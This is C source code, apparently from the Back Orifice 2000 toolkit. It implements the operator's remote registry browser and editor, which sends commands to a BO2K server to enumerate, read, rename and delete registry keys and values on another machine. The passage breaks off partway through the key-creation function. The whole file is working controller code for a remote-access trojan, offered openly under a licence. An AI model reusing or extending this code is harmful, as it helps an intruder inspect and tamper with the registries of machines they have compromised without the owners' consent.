/*  BOTOOL - Back Orifice 2000 File System and Registry Browser/Editor
    Copyright (C) 1999, L0pht Heavy Industries, Inc.

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */


#include<windows.h>
#include<commctrl.h>
#include<plugins.h>
#include<bocomreg.h>
#include<auth.h>
#include<iohandler.h>
#include<encryption.h>
#include<config.h>
#include"comm_native.h"
#include"botool.h"
#include"explore.h"
#include<resource.h>
#include<afxres.h>
#include"strhandle.h"
#include"commnet.h"
#include<regeditfunc.h>

// RegeditDisconnect: Shuts down any socket, and updates the dialog box

BOOL RegeditDisconnect(REGEDIT_CONTEXT *recontext)
{
	if(recontext->pSock==NULL) return FALSE;

	recontext->pSock->Close();
	delete recontext->pSock;
	recontext->pSock=NULL;

	// Update dialog box
	HMENU menu=GetMenu(recontext->hDialog);
	HMENU connmenu=GetSubMenu(menu,3);

	// Enable Connect Menu item
	EnableMenuItem(connmenu,IDM_CONNECT,MF_BYCOMMAND|MF_ENABLED);
	EnableMenuItem(connmenu,IDM_DISCONNECT,MF_BYCOMMAND|MF_GRAYED);

	// Modify title
	recontext->svAddress[0]='\0';
	SetWindowText(recontext->hDialog,"Remote Registry");
	
	// Remove tree items and list items
	HWND htv=GetDlgItem(recontext->hDialog,IDC_REGTREE);
	TreeView_DeleteAllItems(htv);
	HWND hlv=GetDlgItem(recontext->hDialog,IDC_REGLIST);
	ListView_DeleteAllItems(hlv);

	SendMessage(recontext->hDialog,WM_ENABLEITEMS,0,FALSE);

	SendMessage(recontext->hStatus,WM_SETTEXT,0,(LPARAM) "Disconnected");


	return TRUE;
}

// RegeditConnect: Prompts the user for connection information,
// connects an authenticated socket, and updates the dialog box

int RegeditConnect(REGEDIT_CONTEXT *recontext) 
{
	int nRet,len;
	BYTE *data;
	int cmdlen,command,comid,nArg1;
	char *svArg2,*svArg3;
		
	// Update dialog box
	HMENU menu=GetMenu(recontext->hDialog);
	HMENU connmenu=GetSubMenu(menu,3);

	// Create connection socket
	CAuthSocket *pSock=ConnectAuthSocket(InteractiveConnect,0,recontext->hDialog,
		"",
		GetCfgStr(g_szToolOptions,"Cmd Channel Net Module"),
		GetCfgStr(g_szToolOptions,"Cmd Channel Enc"),
		GetCfgStr(g_szToolOptions,"Cmd Channel Auth"));
	
	if(pSock==NULL || pSock==(CAuthSocket *)0xFFFFFFFF) {
		return (int)pSock;
	}

	recontext->pSock=pSock;
	
	// Modify title bar
	char svTitle[512];
	pSock->GetRemoteAddr(recontext->svAddress,256);
	wsprintf(svTitle,"Remote Registry - %.256s",recontext->svAddress);
	SetWindowText(recontext->hDialog,svTitle);
	
	// Enable Disconnect Menu item
	SendMessage(recontext->hDialog,WM_ENABLEITEMS,0,TRUE);

	SendMessage(recontext->hStatus,WM_SETTEXT,0,(LPARAM) "Connected");
	
	// Get remote machine type
	IssueAuthCommandRequest(pSock,BO_SYSINFO,GetTickCount(),0,NULL,NULL);
	int i;
	for(i=0;i<4;i++) {
		while((nRet=pSock->Recv(&data,&len))<=0) Sleep(20);
		if(nRet==-1) { 
			pSock->Free(data);
			RegeditDisconnect(recontext);
			return -1; 
		}
		if(i<3) pSock->Free(data);
	}

	BreakDownCommand(data,&cmdlen,&command,&comid,&nArg1,&svArg2,&svArg3);
	if(strncmp(svArg2,"Could not",9)==0) {
		pSock->Free(data);
		RegeditDisconnect(recontext);
		return -1;
	}

	if(strncmp(svArg2,"Windows NT",10)==0) { 
		recontext->bWinNT=TRUE;		
	} else {
		recontext->bWinNT=FALSE;
	}
	pSock->Free(data);

	// Clean extra data off of socket
	BOOL bDone=FALSE;
	do {
		while((nRet=pSock->Recv(&data,&len))<=0) Sleep(20);
		if(nRet==-1) { 
			pSock->Free(data);
			RegeditDisconnect(recontext);
			return -1; 
		}
		BreakDownCommand(data,&cmdlen,&command,&comid,&nArg1,&svArg2,&svArg3);
		if(strncmp(svArg2,"End of",6)==0)
			bDone=TRUE;
		
		pSock->Free(data);
	} while(!bDone);

	// Add tree items
	HWND htv=GetDlgItem(recontext->hDialog,IDC_REGTREE);
	TVINSERTSTRUCT tvis;
	HTREEITEM hti;

#define TVINSERTFOLDER(_hti,_htv,_tvis,_parent,_image,_selimage,_svtext) \
	memset(&_tvis,0,sizeof(TVINSERTSTRUCT)); \
	tvis.hParent=_parent; \
	tvis.hInsertAfter=TVI_LAST; \
	tvis.item.mask=TVIF_CHILDREN|TVIF_IMAGE|TVIF_SELECTEDIMAGE|TVIF_TEXT; \
	tvis.item.pszText=_svtext; \
	tvis.item.iImage=_image; \
	tvis.item.iSelectedImage=_selimage; \
	tvis.item.cChildren=1; \
	_hti=TreeView_InsertItem(_htv,&_tvis)

	// Root item
	TVINSERTFOLDER(hti,htv,tvis,TVI_ROOT,0,0,recontext->svAddress);
	recontext->root=hti;

	// Top level folders
	HTREEITEM htisub;
	TVINSERTFOLDER(htisub,htv,tvis,hti,1,2,"HKEY_CLASSES_ROOT");
	TVINSERTFOLDER(htisub,htv,tvis,hti,1,2,"HKEY_CURRENT_USER");
	TVINSERTFOLDER(htisub,htv,tvis,hti,1,2,"HKEY_LOCAL_MACHINE");
	TVINSERTFOLDER(htisub,htv,tvis,hti,1,2,"HKEY_USERS");
	TVINSERTFOLDER(htisub,htv,tvis,hti,1,2,"HKEY_CURRENT_CONFIG");
	if(!recontext->bWinNT) {
		TVINSERTFOLDER(htisub,htv,tvis,hti,1,2,"HKEY_DYN_DATA");
	}

	// Expand root item
	TreeView_Expand(htv,recontext->root,TVE_EXPAND);

	return 1;
}

// SelectKey: Pulls across the values associated with the selected key
void SelectKey(REGEDIT_CONTEXT *recontext,HWND htv, HTREEITEM hti, HWND hlv)
{
	int nRet,len;
	BYTE *data;
	int cmdlen,command,comid,nArg1;
	char *svArg2,*svArg3;
	CAuthSocket *pSock=recontext->pSock;
	char svText[260];

	REGVALUE_INFO *rvi;
	LVITEM lvi;

	if(recontext->bEnter==FALSE) 
		return;
	
	// Erase all old items
	int i,count=ListView_GetItemCount(hlv);
	for(i=0;i<count;i++) {
		memset(&lvi,0,sizeof(LVITEM));
		lvi.mask=LVIF_PARAM;
		lvi.iItem=i;
		lvi.iSubItem=0;
		ListView_GetItem(hlv,&lvi);
		rvi=(REGVALUE_INFO *)lvi.lParam;
		if(rvi->pData!=NULL) free(rvi->pData);
		free(rvi);
	}
	ListView_DeleteAllItems(hlv);

	// Get data for newly selected item
	if(hti==NULL) return;

	// Check to see if it's the root key
	if(hti==recontext->root) 
		return;

	// Build the key path
	char *pKeyPath=NULL;
	HTREEITEM htic=hti;
	char svKey[260];
	while(htic!=recontext->root) {
		// Get the key we're selecting
		TVITEM tvi;
		tvi.mask=TVIF_TEXT;
		tvi.hItem=htic;
		tvi.pszText=svKey;
		tvi.cchTextMax=260;
		TreeView_GetItem(htv,&tvi);
		
		// Add to key path
		if(pKeyPath==NULL) {
			pKeyPath=(char *)malloc(lstrlen(svKey)+2);
			lstrcpy(pKeyPath,svKey);
			lstrcat(pKeyPath,"\\");
		} else {
			char *pNewKeyPath=(char *)malloc(lstrlen(svKey)+2+lstrlen(pKeyPath));
			lstrcpy(pNewKeyPath,svKey);
			lstrcat(pNewKeyPath,"\\");
			lstrcat(pNewKeyPath,pKeyPath);
			free(pKeyPath);
			pKeyPath=pNewKeyPath;
		}
		
		htic=TreeView_GetParent(htv,htic);
	}
	if(pKeyPath==NULL) return;
	
	// Now request all of the value names and types
	IssueAuthCommandRequest(pSock,BO_REGISTRYENUMVALS,GetTickCount(),0,pKeyPath,NULL);
	
	// Get "Value "
	while((nRet=pSock->Recv(&data,&len))<=0) Sleep(20);
	if(nRet==-1) { RegeditDisconnect(recontext); 
		free(pKeyPath);
		return; 
	}
	BreakDownCommand(data,&cmdlen,&command,&comid,&nArg1,&svArg2,&svArg3);
	if(strncmp(svArg2,"Unable",6)==0) {
		MessageBox(NULL,svArg2,"Registry Error",MB_OK|MB_ICONINFORMATION|MB_SETFOREGROUND|MB_TOPMOST);
		pSock->Free(data);
		free(pKeyPath);
		return;
	}
	if(strncmp(svArg2,"Value ",6)!=0) { 
		pSock->Free(data);
		RegeditDisconnect(recontext); 
		free(pKeyPath);
		return; 
	}
	pSock->Free(data);
	
	// Get each value name and add to list
	int nCount=0;
	BOOL bDone=FALSE;
	while(!bDone) {
		// --------- Receive value info ----------
		Sleep(20);
		while((nRet=pSock->Recv(&data,&len))<=0) Sleep(20);
		if(nRet==-1) { RegeditDisconnect(recontext); 
			free(pKeyPath);	
			return;	
		}
		BreakDownCommand(data,&cmdlen,&command,&comid,&nArg1,&svArg2,&svArg3);
		if(lstrlen(svArg2)>=7) {
			if(lstrcmp(svArg2+lstrlen(svArg2)-7,"values\n")==0) {
				pSock->Free(data);
				bDone=TRUE;
				continue;
			}
		}
	
		// Insert value into list
		DWORD dwType;
		char *svName;
		if(strncmp(svArg2,"REG_BINARY: ",12)==0) { dwType=REG_BINARY; svName=svArg2+12; }
		else if(strncmp(svArg2,"REG_DWORD: ",11)==0) { dwType=REG_DWORD; svName=svArg2+11; }
		else if(strncmp(svArg2,"REG_EXPAND_SZ: ",15)==0) { dwType=REG_EXPAND_SZ; svName=svArg2+15; }
		else if(strncmp(svArg2,"REG_MULTI_SZ: ",14)==0) { dwType=REG_MULTI_SZ; svName=svArg2+14; }
		else if(strncmp(svArg2,"REG_SZ: ",8)==0) { dwType=REG_SZ; svName=svArg2+8; }
		else { dwType=0; svName=NULL; }
		
		if(svName!=NULL) {	
			lstrcpyn(svKey,svName,260);
			svKey[lstrlen(svName)-1]='\0';

			memset(&lvi,0,sizeof(LVITEM)); 
			lvi.mask=LVIF_TEXT|LVIF_IMAGE|LVIF_PARAM;
			lvi.iItem=0;
			lvi.iSubItem=0;
			if(svKey[0]=='\0') {
				lvi.pszText="(Default)";
			} else {
				lvi.pszText=svKey;
			}
			
			if(dwType==REG_BINARY) lvi.iImage=4;
			else if(dwType==REG_DWORD) lvi.iImage=4;
			else if(dwType==REG_EXPAND_SZ) lvi.iImage=3;
			else if(dwType==REG_MULTI_SZ) lvi.iImage=3;
			else if(dwType==REG_SZ) lvi.iImage=3;
			else lvi.iImage=0;
			rvi=(REGVALUE_INFO *)malloc(sizeof(REGVALUE_INFO));
			lstrcpyn(rvi->svName,svKey,260);
			rvi->dwType=dwType;
			rvi->pData=NULL;
			rvi->dwDataLen=0;
			lvi.lParam=(LPARAM)rvi;
			ListView_InsertItem(hlv,&lvi);
		}
	
		pSock->Free(data);
	
		// Show value count
		nCount++;
		wsprintf(svText,"Connected:  %d Values",nCount);
		SetWindowText(recontext->hStatus,svText);
		UpdateWindow(recontext->hStatus);
	}

	// Now we go and get the ACTUAL values of each value
	count=ListView_GetItemCount(hlv);
	for(i=0;i<count;i++) {
		memset(&lvi,0,sizeof(LVITEM));
		lvi.mask=LVIF_PARAM;
		lvi.iItem=i;
		lvi.iSubItem=0;
		ListView_GetItem(hlv,&lvi);
		rvi=(REGVALUE_INFO *)lvi.lParam;
		
		// Request all of the value data
		IssueAuthCommandRequest(pSock,BO_REGISTRYGETVALUE,GetTickCount(),0,pKeyPath,rvi->svName);
		
		// Get "Value: "
		while((nRet=pSock->Recv(&data,&len))<=0) Sleep(20);
		if(nRet==-1) { RegeditDisconnect(recontext); 
			free(pKeyPath);
			return; 
		}
		BreakDownCommand(data,&cmdlen,&command,&comid,&nArg1,&svArg2,&svArg3);
		if(strncmp(svArg2,"Could not",9)==0) {
			MessageBox(NULL,svArg2,"Registry Error",MB_OK|MB_ICONINFORMATION|MB_SETFOREGROUND|MB_TOPMOST);
			pSock->Free(data);
			continue;
		}
		if(strncmp(svArg2,"Value: ",7)!=0) { 
			free(pKeyPath);
			pSock->Free(data);
			RegeditDisconnect(recontext); 
			return; 
		}

		// Allocate buffer for value data
		rvi->dwDataLen=atoi(svArg2+7);
		rvi->pData=malloc(rvi->dwDataLen);
		memset(rvi->pData,0,rvi->dwDataLen);

		pSock->Free(data);
		
		// Get value data
		char *pc,c;
		DWORD dwBytes=0,dw;
		BYTE b;
		BOOL bDone=FALSE;
		svText[0]='\0';
		while(!bDone) {
			// --------- Receive value info ----------
			Sleep(20);
			while((nRet=pSock->Recv(&data,&len))<=0) Sleep(20);
			if(nRet==-1) { RegeditDisconnect(recontext); 
				free(pKeyPath);
				return; 
			}
			BreakDownCommand(data,&cmdlen,&command,&comid,&nArg1,&svArg2,&svArg3);
			if(lstrcmp(svArg2,"Value retrieved.\n")==0 && dwBytes==rvi->dwDataLen) {
				pSock->Free(data);
				bDone=TRUE;
				continue;
			}
			if(svText[0]=='\0') {
				lstrcpyn(svText,svArg2,260);
				svText[lstrlen(svText)-1]='\0';
				if(lstrlen(svText)==0) {
					lstrcpy(svText,"(value not set)");
				}
			}

			// Parse data string based on type
			switch(rvi->dwType) {
			case REG_BINARY:
				dw=dwBytes;
				dwBytes=min(dwBytes+16,rvi->dwDataLen);
				pc=svArg2;
				while(dw<dwBytes) {
					c=*pc;
					if(c>='A' && c<='F') b=((c-'A')+10)<<4;
					else if(c>='a' && c<='f') b=((c-'a')+10)<<4;
					else if(c>='0' && c<='9') b=(c-'0')<<4;
					pc++;
					
					c=*pc;
					if(c>='A' && c<='F') b|=((c-'A')+10);
					else if(c>='a' && c<='f') b|=((c-'a')+10);
					else if(c>='0' && c<='9') b|=(c-'0');
					pc+=2;

					*((BYTE *)rvi->pData+dw)=b;
					dw++;
				}
				break;
			case REG_DWORD:
				*((DWORD *)rvi->pData)=atoi(svArg2);
				dwBytes+=4;
				break;
			case REG_SZ:
			case REG_EXPAND_SZ:
			case REG_MULTI_SZ:
				UnescapeString(svArg2);
				svArg2[lstrlen(svArg2)-1]='\0';
				memcpy(((BYTE *)rvi->pData)+dwBytes,svArg2,lstrlen(svArg2)+1);
				dwBytes+=lstrlen(svArg2)+1;
				break;
			}
			pSock->Free(data);
		}
		
		// Add subitem to display data somewhat
		lvi.mask=LVIF_TEXT;
		lvi.iSubItem=1;
		lvi.pszText=svText;
		ListView_SetItem(hlv,&lvi);
		
		// Show value loaded info
		wsprintf(svText,"Connected:  %d Values loaded.",i);
		SetWindowText(recontext->hStatus,svText);
		UpdateWindow(recontext->hStatus);
	}
	wsprintf(svText,"Connected: %.200s",pKeyPath);
	SetWindowText(recontext->hStatus,svText);
	UpdateWindow(recontext->hStatus);

	free(pKeyPath);
}

// CollapseKey: Deletes the items associated with a particular branch
void CollapseKey(REGEDIT_CONTEXT *recontext,HWND htv,HTREEITEM hti)
{
	if(recontext->bEnter==FALSE) 
		return;

	recontext->bEnter=FALSE;

	if(hti!=recontext->root) {
		BOOL bDone=FALSE;
		do {
			HTREEITEM htic;
			htic=TreeView_GetChild(htv,hti);
			if(htic==NULL) bDone=TRUE;
			else {
				TreeView_DeleteItem(htv,htic);
			}
		} while(!bDone);
		
		TVITEM tvi;
		tvi.hItem=hti;
		tvi.mask=TVIF_HANDLE|TVIF_CHILDREN|TVIF_STATE;
		tvi.stateMask=TVIS_EXPANDED;
		TreeView_GetItem(htv,&tvi);
		tvi.cChildren=1;
		tvi.state=0;
		TreeView_SetItem(htv,&tvi);
	} else {
		HTREEITEM htiChild=TreeView_GetChild(htv,hti);
		while(htiChild!=NULL) {
			BOOL bDone=FALSE;
			do {
				HTREEITEM htic;
				htic=TreeView_GetChild(htv,htiChild);
				if(htic==NULL) bDone=TRUE;
				else {
					TreeView_DeleteItem(htv,htic);
				}
			} while(!bDone);
			htiChild=TreeView_GetNextSibling(htv,htiChild);
		}
	}

	recontext->bEnter=TRUE;
}

// ExpandKey: Fills in the registry editor tree for a particular branch
void ExpandKey(REGEDIT_CONTEXT *recontext,HWND htv,HTREEITEM hti)
{
	int nRet,len;
	BYTE *data;
	int cmdlen,command,comid,nArg1;
	char *svArg2,*svArg3;
	CAuthSocket *pSock=recontext->pSock;
	char svText[260];
	
	if(recontext->bEnter==FALSE) 
		return;

	// Check to see if it's the root key
	if(hti==recontext->root) return;

	// Build the key path
	char *pKeyPath=NULL;
	HTREEITEM htic=hti;
	char svKey[260];
	while(htic!=recontext->root) {
		// Get the key we're expanding		
		TVITEM tvi;
		tvi.mask=TVIF_TEXT;
		tvi.hItem=htic;
		tvi.pszText=svKey;
		tvi.cchTextMax=260;
		TreeView_GetItem(htv,&tvi);
		
		// Add to key path
		if(pKeyPath==NULL) {
			pKeyPath=(char *)malloc(lstrlen(svKey)+2);
			lstrcpy(pKeyPath,svKey);
			lstrcat(pKeyPath,"\\");
		} else {
			char *pNewKeyPath=(char *)malloc(lstrlen(svKey)+2+lstrlen(pKeyPath));
			lstrcpy(pNewKeyPath,svKey);
			lstrcat(pNewKeyPath,"\\");
			lstrcat(pNewKeyPath,pKeyPath);
			free(pKeyPath);
			pKeyPath=pNewKeyPath;
		}
		
		htic=TreeView_GetParent(htv,htic);
	}
	if(pKeyPath==NULL) return;
	
	// Now request all of the subkeys
	IssueAuthCommandRequest(pSock,BO_REGISTRYENUMKEYS,GetTickCount(),0,pKeyPath,NULL);
	
	// Get "Subkeys:"
	while((nRet=pSock->Recv(&data,&len))<=0) Sleep(20);
	if(nRet==-1) { RegeditDisconnect(recontext); 
		free(pKeyPath);
		return; 
	}
	BreakDownCommand(data,&cmdlen,&command,&comid,&nArg1,&svArg2,&svArg3);
	if(strncmp(svArg2,"Unable",6)==0) {
		MessageBox(NULL,svArg2,"Registry Error",MB_OK|MB_ICONINFORMATION|MB_SETFOREGROUND|MB_TOPMOST);
		pSock->Free(data);
		free(pKeyPath);
		return;
	}
	if(strncmp(svArg2,"Subkeys:",8)!=0) { 
		pSock->Free(data);
		RegeditDisconnect(recontext); 
		free(pKeyPath);
		return; 
	}
	pSock->Free(data);
	
	// Get each key and add them
	int nCount=0;
	BOOL bDone=FALSE;
	while(!bDone) {
		// --------- Receive key info ----------
		Sleep(20);
		while((nRet=pSock->Recv(&data,&len))<=0) Sleep(20);
		if(nRet==-1) { RegeditDisconnect(recontext); 
			free(pKeyPath);
			return; 
		}
		BreakDownCommand(data,&cmdlen,&command,&comid,&nArg1,&svArg2,&svArg3);
		if(lstrlen(svArg2)>=5) {
			if(lstrcmp(svArg2+lstrlen(svArg2)-5,"keys\n")==0) {
				pSock->Free(data);
				bDone=TRUE;
				continue;
			}
		}
	
		// Insert key into tree
		if(lstrlen(svArg2)>2) {
			lstrcpyn(svKey,svArg2+2,260);
			int nChildren=0;
			if(svKey[lstrlen(svKey)-2]=='\\') {
				nChildren=1;
				svKey[lstrlen(svKey)-2]='\0';
			} else {
				svKey[lstrlen(svKey)-1]='\0';
			}

			TVINSERTSTRUCT tvis;
			
			memset(&tvis,0,sizeof(TVINSERTSTRUCT)); 
			tvis.hParent=hti; 
			tvis.hInsertAfter=TVI_SORT; 
			tvis.item.mask=TVIF_CHILDREN|TVIF_IMAGE|TVIF_SELECTEDIMAGE|TVIF_TEXT; 
			tvis.item.pszText=svKey; 
			tvis.item.iImage=1; 
			tvis.item.iSelectedImage=2; 
			tvis.item.cChildren=nChildren; 
			TreeView_InsertItem(htv,&tvis);
		}

		pSock->Free(data);
	
		// Show key count
		nCount++;
		wsprintf(svText,"Connected: %d Keys",nCount);
		SetWindowText(recontext->hStatus,svText);
		UpdateWindow(recontext->hStatus);
	}

	wsprintf(svText,"Connected: %.200s",pKeyPath);
	SetWindowText(recontext->hStatus,svText);
	UpdateWindow(recontext->hStatus);
	free(pKeyPath);
}

BOOL RenameKey(REGEDIT_CONTEXT *recontext, HWND htv, TVITEM tvi)
{
	int nRet,len;
	BYTE *data;
	int cmdlen,command,comid,nArg1;
	char *svArg2,*svArg3;
	CAuthSocket *pSock=recontext->pSock;
	
	// Check to see if it's the root key
	if(tvi.hItem==recontext->root) 
		return FALSE;
	// Check if it's a child of the root key
	if(recontext->root==TreeView_GetParent(htv,tvi.hItem))
		return FALSE;

	// Build the key path
	char *pKeyPath=NULL;
	HTREEITEM htic=tvi.hItem;
	char svKey[260];
	while(htic!=recontext->root) {
		// Get the key we're renaming
		TVITEM tvi;
		tvi.mask=TVIF_TEXT;
		tvi.hItem=htic;
		tvi.pszText=svKey;
		tvi.cchTextMax=260;
		TreeView_GetItem(htv,&tvi);
		
		// Add to key path
		if(pKeyPath==NULL) {
			pKeyPath=(char *)malloc(lstrlen(svKey)+2);
			lstrcpy(pKeyPath,svKey);
			lstrcat(pKeyPath,"\\");
		} else {
			char *pNewKeyPath=(char *)malloc(lstrlen(svKey)+2+lstrlen(pKeyPath));
			lstrcpy(pNewKeyPath,svKey);
			lstrcat(pNewKeyPath,"\\");
			lstrcat(pNewKeyPath,pKeyPath);
			free(pKeyPath);
			pKeyPath=pNewKeyPath;
		}
		
		htic=TreeView_GetParent(htv,htic);
	}
	if(pKeyPath==NULL) return FALSE;

	// Now request the rename
	IssueAuthCommandRequest(pSock,BO_REGISTRYRENAMEKEY,GetTickCount(),0,pKeyPath,tvi.pszText);
	
	// Get "Key renamed."
	while((nRet=pSock->Recv(&data,&len))<=0) Sleep(20);
	if(nRet==-1) { 
		RegeditDisconnect(recontext); 
		free(pKeyPath);
		return FALSE; 
	}
	BreakDownCommand(data,&cmdlen,&command,&comid,&nArg1,&svArg2,&svArg3);
	if(strncmp(svArg2,"Could not",9)==0) {
		MessageBox(NULL,svArg2,"Registry Error",MB_OK|MB_ICONINFORMATION|MB_SETFOREGROUND|MB_TOPMOST);
		pSock->Free(data);
		free(pKeyPath);
		return FALSE;
	}
	if(strncmp(svArg2,"Key renamed.",12)!=0) { 
		pSock->Free(data);
		RegeditDisconnect(recontext); 
		free(pKeyPath);
		return FALSE;
	}
	pSock->Free(data);
	free(pKeyPath);
	
	return TRUE;
}
					
BOOL RenameValue(REGEDIT_CONTEXT *recontext, HWND htv, HTREEITEM hti, char *svOldValue, char *svNewValue)
{
	int nRet,len;
	BYTE *data;
	int cmdlen,command,comid,nArg1;
	char *svArg2,*svArg3;
	CAuthSocket *pSock=recontext->pSock;
	
	// Check to see if it's the root key
	if(hti==recontext->root) 
		return FALSE;

	// Build the key path
	char *pKeyPath=NULL;
	HTREEITEM htic=hti;
	char svKey[260];
	while(htic!=recontext->root) {
		// Get the key we're renaming
		TVITEM tvi;
		tvi.mask=TVIF_TEXT;
		tvi.hItem=htic;
		tvi.pszText=svKey;
		tvi.cchTextMax=260;
		TreeView_GetItem(htv,&tvi);
		
		// Add to key path
		if(pKeyPath==NULL) {
			pKeyPath=(char *)malloc(lstrlen(svKey)+2);
			lstrcpy(pKeyPath,svKey);
			lstrcat(pKeyPath,"\\");
		} else {
			char *pNewKeyPath=(char *)malloc(lstrlen(svKey)+2+lstrlen(pKeyPath));
			lstrcpy(pNewKeyPath,svKey);
			lstrcat(pNewKeyPath,"\\");
			lstrcat(pNewKeyPath,pKeyPath);
			free(pKeyPath);
			pKeyPath=pNewKeyPath;
		}
		
		htic=TreeView_GetParent(htv,htic);
	}
	if(pKeyPath==NULL) return FALSE;

	// Get the value name in the first argument
	char *pNewKeyPath=(char *)malloc(lstrlen(pKeyPath)+lstrlen(svOldValue)+2);
	lstrcpy(pNewKeyPath,pKeyPath);
	lstrcat(pNewKeyPath,"\\");
	lstrcat(pNewKeyPath,svOldValue);
	free(pKeyPath);
	pKeyPath=pNewKeyPath;

	// Now request the rename
	IssueAuthCommandRequest(pSock,BO_REGISTRYRENAMEVALUE,GetTickCount(),0,pKeyPath,svNewValue);
	
	// Get "Value renamed."
	while((nRet=pSock->Recv(&data,&len))<=0) Sleep(20);
	if(nRet==-1) { RegeditDisconnect(recontext); return FALSE; }
	BreakDownCommand(data,&cmdlen,&command,&comid,&nArg1,&svArg2,&svArg3);
	if(strncmp(svArg2,"Could not",9)==0) {
		MessageBox(NULL,svArg2,"Registry Error",MB_OK|MB_ICONINFORMATION|MB_SETFOREGROUND|MB_TOPMOST);
		pSock->Free(data);
		return FALSE;
	}
	if(strncmp(svArg2,"Value ",6)!=0) { 
		pSock->Free(data);
		RegeditDisconnect(recontext); 
		return FALSE;
	}
	pSock->Free(data);
	
	return TRUE;
}

BOOL DeleteKey(REGEDIT_CONTEXT *recontext, HWND htv, HTREEITEM hti)
{
	int nRet,len;
	BYTE *data;
	int cmdlen,command,comid,nArg1;
	char *svArg2,*svArg3;
	CAuthSocket *pSock=recontext->pSock;
	
	// Check to see if it's the root key
	if(hti==recontext->root) 
		return FALSE;
	// Check if it's a child of the root key
	if(recontext->root==TreeView_GetParent(htv,hti))
		return FALSE;

	// Build the key path
	char *pKeyPath=NULL;
	HTREEITEM htic=hti;
	char svKey[260];
	while(htic!=recontext->root) {
		// Get the key we're renaming
		TVITEM tvi;
		tvi.mask=TVIF_TEXT;
		tvi.hItem=htic;
		tvi.pszText=svKey;
		tvi.cchTextMax=260;
		TreeView_GetItem(htv,&tvi);
		
		// Add to key path
		if(pKeyPath==NULL) {
			pKeyPath=(char *)malloc(lstrlen(svKey)+2);
			lstrcpy(pKeyPath,svKey);
			lstrcat(pKeyPath,"\\");
		} else {
			char *pNewKeyPath=(char *)malloc(lstrlen(svKey)+2+lstrlen(pKeyPath));
			lstrcpy(pNewKeyPath,svKey);
			lstrcat(pNewKeyPath,"\\");
			lstrcat(pNewKeyPath,pKeyPath);
			free(pKeyPath);
			pKeyPath=pNewKeyPath;
		}
		
		htic=TreeView_GetParent(htv,htic);
	}
	if(pKeyPath==NULL) return FALSE;

	// Now request the delete
	IssueAuthCommandRequest(pSock,BO_REGISTRYDELETEKEY,GetTickCount(),0,pKeyPath,NULL);
	
	// Get "Key deleted."
	while((nRet=pSock->Recv(&data,&len))<=0) Sleep(20);
	if(nRet==-1) { 
		RegeditDisconnect(recontext); 
		free(pKeyPath);
		return FALSE; 
	}
	BreakDownCommand(data,&cmdlen,&command,&comid,&nArg1,&svArg2,&svArg3);
	if(strncmp(svArg2,"Could not",9)==0) {
		MessageBox(NULL,svArg2,"Registry Error",MB_OK|MB_ICONINFORMATION|MB_SETFOREGROUND|MB_TOPMOST);
		pSock->Free(data);
		free(pKeyPath);
		return FALSE;
	}
	if(strncmp(svArg2,"Key deleted.",12)!=0) { 
		pSock->Free(data);
		RegeditDisconnect(recontext); 
		free(pKeyPath);
		return FALSE;
	}
	pSock->Free(data);
	free(pKeyPath);
	
	return TRUE;	
}

BOOL DeleteValue(REGEDIT_CONTEXT *recontext, HWND htv, HTREEITEM hti, char *svValueName)
{
	int nRet,len;
	BYTE *data;
	int cmdlen,command,comid,nArg1;
	char *svArg2,*svArg3;
	CAuthSocket *pSock=recontext->pSock;
	
	// Check to see if it's the root key
	if(hti==recontext->root) 
		return FALSE;

	// Build the key path
	char *pKeyPath=NULL;
	HTREEITEM htic=hti;
	char svKey[260];
	while(htic!=recontext->root) {
		// Get the key we're renaming
		TVITEM tvi;
		tvi.mask=TVIF_TEXT;
		tvi.hItem=htic;
		tvi.pszText=svKey;
		tvi.cchTextMax=260;
		TreeView_GetItem(htv,&tvi);
		
		// Add to key path
		if(pKeyPath==NULL) {
			pKeyPath=(char *)malloc(lstrlen(svKey)+2);
			lstrcpy(pKeyPath,svKey);
			lstrcat(pKeyPath,"\\");
		} else {
			char *pNewKeyPath=(char *)malloc(lstrlen(svKey)+2+lstrlen(pKeyPath));
			lstrcpy(pNewKeyPath,svKey);
			lstrcat(pNewKeyPath,"\\");
			lstrcat(pNewKeyPath,pKeyPath);
			free(pKeyPath);
			pKeyPath=pNewKeyPath;
		}
		
		htic=TreeView_GetParent(htv,htic);
	}
	if(pKeyPath==NULL) return FALSE;

	// Now request the delete
	IssueAuthCommandRequest(pSock,BO_REGISTRYDELETEVALUE,GetTickCount(),0,pKeyPath,svValueName);
	
	// Get "Value deleted."
	while((nRet=pSock->Recv(&data,&len))<=0) Sleep(20);
	if(nRet==-1) { 
		RegeditDisconnect(recontext); 
		free(pKeyPath);
		return FALSE; 
	}
	BreakDownCommand(data,&cmdlen,&command,&comid,&nArg1,&svArg2,&svArg3);
	if(strncmp(svArg2,"Could not",9)==0) {
		MessageBox(NULL,svArg2,"Registry Error",MB_OK|MB_ICONINFORMATION|MB_SETFOREGROUND|MB_TOPMOST);
		free(pKeyPath);
		pSock->Free(data);
		return FALSE;
	}
	if(strncmp(svArg2,"Value ",6)!=0) { 
		pSock->Free(data);
		free(pKeyPath);
		RegeditDisconnect(recontext); 
		return FALSE;
	}
	pSock->Free(data);	
	free(pKeyPath);
	return TRUE;
}


// CreateNewKey: Creates a new key

BOOL CreateNewKey(REGEDIT_CONTEXT *recontext, HWND htv, HTREEITEM hti, char *svKeyName)
{
	int nRet,len;
	BYTE *data;
	int cmdlen,command,comid,nArg1;
	char *svArg2,*svArg3;
	CAuthSocket *pSock=recontext->pSock;
	
	// Check to see if it's the root key
	if(hti==recontext->root) 
		return FALSE;
	
	// Build the key path
	char *pKeyPath=NULL;
	HTREEITEM htic=hti;
	char svKey[260];
	while(htic!=recontext->root) {
		// Get the key we're renaming
		TVITEM tvi;
		tvi.mask=TVIF_TEXT;
		tvi.hItem=htic;
		tvi.pszText=svKey;
		tvi.cchTextMax=260;
		TreeView_GetItem(htv,&tvi);
		
		// Add to key path
		if(pKeyPath==NULL) {
			pKeyPath=(char *)malloc(lstrlen(svKey)+2);
			lstrcpy(pKeyPath,svKey);
			lstrcat(pKeyPath,"\\");
		} else {
